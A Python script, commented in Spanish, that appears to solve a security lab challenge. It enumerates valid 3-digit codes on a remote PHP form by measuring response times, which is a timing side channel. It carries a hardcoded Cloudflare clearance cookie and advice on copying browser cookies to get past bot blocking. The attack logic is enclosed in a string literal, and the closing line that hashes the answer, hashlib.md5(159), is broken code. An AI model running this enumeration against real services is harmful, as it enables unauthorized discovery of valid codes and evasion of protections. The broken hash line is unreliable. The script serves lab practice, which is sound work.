#!/usr/bin/env python3
# Enumeracion por canal lateral de temporizacion - lab "Asistencia"
# Mide el tiempo de respuesta de cada codigo; los validos tardan ~1s.
# NO paraleliza: la concurrencia corrompe la medicion de timing.

'''import time
import statistics
import requests

BASE = "https://chl-2b54f728-a31d-4192-a084-1973de79c635-asistencia.softwareseguro.com.ar/index.php"
CLAVE = "xxxx"            # clave invalida cualquiera
INICIO, FIN = 0, 999     # espacio completo de 3 digitos
UMBRAL_S = 0.40          # candidato si tarda mas que esto (ajustalo segun lo que veas)
MUESTRAS_CONFIRM = 5     # re-mediciones por candidato en fase 2

# Cloudflare puede bloquear si no mandas tu cookie/headers de navegador.
# Copiala de DevTools (Network -> una request -> Headers -> cookie).
COOKIES = {
    "cf_clearance": "CrsPDUcVQJ9izZB2_HxK52M70PDMiko2z3lxL8N58v_DVxdUmPR_jCyZP7Mbnb1S3rfM3vhp4UXiDUCr7g0dME81owV-loxGxZOKHCavOgYt7ZYyztsXgLYEth8TextgO6JjbmCeRj1Nfomdzc1w52qfeI0y8EgpdN1PP-MeKFtO8qRVlWeyCBkINhG_nebWuu8LE1hS58mU4NvUAwRlHrjhWpXPx75r2_2cW9oULotaZMUBCuf_McIdsPcD5B5C09Y5tAZGF5peeVYQejKAQu98oAp6HkiMwZ3-Cy8asXLgu7djBQ",
}
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE.rsplit("/", 1)[0],
    "Referer": BASE,
}

sesion = requests.Session()
sesion.headers.update(HEADERS)
sesion.cookies.update(COOKIES)


def medir(codigo):
    """Devuelve el tiempo en segundos de un POST, o None si falla."""
    data = {"codigo": f"{codigo:03d}", "clave": CLAVE}
    t0 = time.perf_counter()
    try:
        r = sesion.post(BASE, data=data, timeout=10)
        dt = time.perf_counter() - t0
        return dt, r.status_code
    except requests.RequestException:
        return None, None


# ---------- Fase 1: barrido rapido ----------
print("Fase 1: barriendo", INICIO, "a", FIN, "...")
candidatos = []
for c in range(INICIO, FIN + 1):
    dt, st = medir(c)
    if dt is None:
        print(f"  {c:03d}  ERROR")
        continue
    if dt >= UMBRAL_S:
        candidatos.append(c)
        print(f"  {c:03d}  {dt*1000:7.0f} ms  <-- candidato")

print(f"\nFase 1: {len(candidatos)} candidatos por encima de {UMBRAL_S*1000:.0f} ms")

# ---------- Fase 2: confirmacion ----------
print("\nFase 2: re-midiendo candidatos", MUESTRAS_CONFIRM, "veces c/u...")
confirmados = []
for c in candidatos:
    tiempos = []
    for _ in range(MUESTRAS_CONFIRM):
        dt, _ = medir(c)
        if dt is not None:
            tiempos.append(dt)
        time.sleep(0.1)
    med = statistics.median(tiempos) if tiempos else 0
    estado = "VALIDO" if med >= UMBRAL_S else "descartado (jitter)"
    if med >= UMBRAL_S:
        confirmados.append(c)
    print(f"  {c:03d}  mediana {med*1000:7.0f} ms  -> {estado}")

# ---------- Resultado para que lo interpretes vos ----------
print("\n" + "=" * 40)
print("Codigos confirmados (ordenados):")
print(sorted(f"{c:03d}" for c in confirmados))
print("Cantidad de confirmados:", len(confirmados))
print("=" * 40)
'''
#El numero de arriba es tu cantidad de asistentes.
# El MD5 lo calculas vos cuando estes seguro del conteo:
import hashlib
print(hashlib.md5(159))
